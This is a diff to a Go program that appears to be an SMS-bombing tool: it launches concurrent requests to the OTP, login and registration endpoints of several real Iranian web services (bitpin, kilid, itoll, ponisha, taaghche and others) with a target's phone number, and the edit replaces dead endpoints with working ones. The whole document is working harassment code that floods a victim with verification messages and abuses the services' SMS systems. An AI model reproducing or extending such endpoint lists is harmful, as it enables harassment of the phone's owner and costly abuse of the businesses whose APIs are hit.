@@ -186,7 +186,7 @@ func main() {
 		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
 			"phone=": phone,
 		}, ch)  //Password required
-//delete site az domain
+//delete site from domain
 		go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // idon't know ???
@@ -204,16 +204,12 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+  //delete site from domain
+		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
-		go sms("https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{
-			"mobile=": phone,
-		}, ch)
-		go sms("https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{
-			"mobile_phone": phone,
-		}, ch)
+ //delete site from domain
 		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
 			"contact": phone,
 		}, ch)
